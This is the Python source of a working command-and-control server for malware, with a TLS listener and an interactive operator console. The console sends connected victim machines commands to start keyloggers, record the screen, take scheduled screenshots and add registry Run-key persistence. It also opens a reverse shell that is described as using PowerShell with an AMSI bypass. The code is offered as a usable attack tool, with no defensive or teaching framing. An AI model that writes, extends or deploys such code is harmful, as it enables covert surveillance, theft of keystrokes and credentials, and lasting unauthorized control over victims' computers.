#!/usr/bin/env python3
"""
C2 Server – Final version with module control, session management, and interactive console.
"""
import socket
import ssl
import threading
import sys
import time
import json
import os
import base64
from cmd import Cmd

# ========== CONFIG ==========
LISTEN_IP = "127.0.0.1"
LISTEN_PORT = 4443
CERT_FILE = "server.crt"
KEY_FILE = "server.key"
USE_TLS = True

# ========== COLORS ==========
RESET = "\033[0m"
RED   = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN  = "\033[96m"
def color(text, code):
    return f"{code}{text}{RESET}"

# ========== SERVER CORE ==========
class C2Server:
    def __init__(self):
        self.sessions = {}          # sid -> socket
        self.session_data = {}      # sid -> metadata
        self.counter = 0
        self.running = True
        self.current_sid = None

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((LISTEN_IP, LISTEN_PORT))
        sock.listen(5)

        if USE_TLS:
            if not (os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE)):
                print(color("[!] Certificate missing. Generate with: openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes", RED))
                sys.exit(1)
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
            self.server = context.wrap_socket(sock, server_side=True)
        else:
            self.server = sock

        print(color(f"[*] Server listening on {LISTEN_IP}:{LISTEN_PORT}", GREEN))
        threading.Thread(target=self.accept_clients, daemon=True).start()
        console = C2Console(self)
        console.cmdloop()

    def accept_clients(self):
        while self.running:
            try:
                client, addr = self.server.accept()
                self.counter += 1
                sid = self.counter
                self.sessions[sid] = client
                self.session_data[sid] = {'addr': addr, 'alive': True}
                print(color(f"[+] New session #{sid} from {addr[0]}:{addr[1]}", GREEN))
                threading.Thread(target=self.handle_client, args=(sid,), daemon=True).start()
            except Exception as e:
                if self.running:
                    print(color(f"[!] Accept error: {e}", RED))

    def handle_client(self, sid):
        sock = self.sessions[sid]
        try:
            sock.send(b"OK\n")   # initial handshake
            while self.running and self.session_data[sid]['alive']:
                data = sock.recv(4096)
                if not data:
                    break
                # We handle JSON responses from the client (like screenshot data, etc.)
                try:
                    msg = json.loads(data.decode())
                    if msg.get('type') == 'screenshot':
                        # Save screenshot
                        fname = f"screenshot_{sid}_{int(time.time())}.png"
                        with open(fname, 'wb') as f:
                            f.write(base64.b64decode(msg['data']))
                        print(color(f"[*] Screenshot from session #{sid} saved as {fname}", GREEN))
                except:
                    pass
        except Exception as e:
            print(color(f"[!] Client #{sid} error: {e}", RED))
        finally:
            print(color(f"[-] Session #{sid} disconnected", RED))
            self.session_data[sid]['alive'] = False
            try:
                sock.close()
            except:
                pass

    def get_session(self, sid):
        if sid in self.sessions and self.session_data.get(sid, {}).get('alive'):
            return self.sessions[sid]
        return None

    def send_command(self, sid, cmd, **kwargs):
        sock = self.get_session(sid)
        if not sock:
            return False
        try:
            msg = {'cmd': cmd}
            msg.update(kwargs)
            sock.send((json.dumps(msg) + "\n").encode())
            return True
        except:
            return False

# ========== CONSOLE ==========
class C2Console(Cmd):
    intro = color("C2 Framework – type 'help' for commands.", CYAN)
    prompt = color("C2> ", CYAN)

    def __init__(self, server):
        super().__init__()
        self.server = server
        self.current_sid = None

    def emptyline(self):
        pass

    def do_list(self, arg):
        """List active sessions"""
        if not self.server.sessions:
            print("No active sessions.")
            return
        print("Active sessions:")
        for sid, data in self.server.session_data.items():
            status = color("ALIVE", GREEN) if data['alive'] else color("DEAD", RED)
            addr = data.get('addr', 'unknown')
            print(f"  #{sid} – {addr} ({status})")

    def do_use(self, arg):
        """Select a session: use <id>"""
        if not arg:
            print("Usage: use <id>")
            return
        try:
            sid = int(arg)
            if sid in self.server.sessions and self.server.session_data[sid]['alive']:
                self.current_sid = sid
                print(f"Now using session #{sid}")
            else:
                print(f"Session #{sid} not alive or doesn't exist.")
        except ValueError:
            print("Invalid session ID.")

    def do_sessions(self, arg):
        """Alias for 'list'"""
        self.do_list(arg)

    def do_background(self, arg):
        """Return to main prompt from an interactive session (not needed here)"""
        pass

    def do_help(self, arg):
        """Show this help"""
        print("Available commands:")
        for attr in dir(self):
            if attr.startswith('do_') and attr != 'do_help':
                cmd = attr[3:]
                doc = getattr(self, attr).__doc__
                print(f"  {cmd:15} – {doc}")

    # ---------- Module Control Commands ----------
    def do_keylog_start(self, arg):
        """Start the keylogger on the current session"""
        if self.current_sid is None:
            print("No session selected.")
            return
        if self.server.send_command(self.current_sid, 'keylog_start'):
            print("Keylogger start command sent.")
        else:
            print("Failed to send command.")

    def do_keylog_stop(self, arg):
        """Stop the keylogger and retrieve logs"""
        if self.current_sid is None:
            print("No session selected.")
            return
        if self.server.send_command(self.current_sid, 'keylog_stop'):
            print("Keylogger stop command sent. Logs will be sent via Discord.")
        else:
            print("Failed to send command.")

    def do_screen_start(self, arg):
        """Start screen recording (30s clips)"""
        if self.current_sid is None:
            print("No session selected.")
            return
        if self.server.send_command(self.current_sid, 'screen_start'):
            print("Screen recording start command sent.")
        else:
            print("Failed to send command.")

    def do_screen_stop(self, arg):
        """Stop screen recording"""
        if self.current_sid is None:
            print("No session selected.")
            return
        if self.server.send_command(self.current_sid, 'screen_stop'):
            print("Screen recording stop command sent.")
        else:
            print("Failed to send command.")

    def do_screenshot_start(self, arg):
        """Start scheduled screenshots (every 30s)"""
        if self.current_sid is None:
            print("No session selected.")
            return
        if self.server.send_command(self.current_sid, 'screenshot_start'):
            print("Screenshot scheduling start command sent.")
        else:
            print("Failed to send command.")

    def do_screenshot_stop(self, arg):
        """Stop scheduled screenshots"""
        if self.current_sid is None:
            print("No session selected.")
            return
        if self.server.send_command(self.current_sid, 'screenshot_stop'):
            print("Screenshot scheduling stop command sent.")
        else:
            print("Failed to send command.")

    def do_screenshot(self, arg):
        """Take a single screenshot and send to server (stores locally)"""
        if self.current_sid is None:
            print("No session selected.")
            return
        if self.server.send_command(self.current_sid, 'screenshot'):
            print("Single screenshot command sent.")
        else:
            print("Failed to send command.")

    def do_shell(self, arg):
        """Spawn an interactive reverse shell (PowerShell with AMSI bypass)"""
        if self.current_sid is None:
            print("No session selected.")
            return
        # We'll override the console to enter shell mode
        self.enter_shell_mode(self.current_sid)

    def enter_shell_mode(self, sid):
        sock = self.server.get_session(sid)
        if not sock:
            print("Session not alive.")
            return
        # Send shell command to client
        if not self.server.send_command(sid, 'shell'):
            print("Failed to start shell.")
            return
        print(f"Entering interactive shell on session #{sid}. Type 'exit' to return.")
        # We'll create a thread to read from socket and print
        def reader():
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    sys.stdout.write(data.decode(errors='replace'))
                    sys.stdout.flush()
                except:
                    break
        threading.Thread(target=reader, daemon=True).start()
        # Main thread sends user input
        while True:
            try:
                cmd = input()
                if cmd.lower() == 'exit':
                    break
                sock.send((cmd + "\n").encode())
            except (KeyboardInterrupt, EOFError):
                print("\n[!] Interrupted.")
                break
            except:
                break
        print("[*] Shell session ended.")

    def do_status(self, arg):
        """Get status of modules on current session"""
        if self.current_sid is None:
            print("No session selected.")
            return
        if self.server.send_command(self.current_sid, 'status'):
            print("Status request sent.")
        else:
            print("Failed to send command.")

    def do_persistence(self, arg):
        """Enable persistence on the target (registry Run key)"""
        if self.current_sid is None:
            print("No session selected.")
            return
        if self.server.send_command(self.current_sid, 'persistence'):
            print("Persistence enable command sent.")
        else:
            print("Failed to send command.")

    def do_exit(self, arg):
        """Exit the server"""
        self.server.running = False
        print("Shutting down...")
        sys.exit(0)

    def do_quit(self, arg):
        self.do_exit(arg)

if __name__ == "__main__":
    server = C2Server()
    server.start()
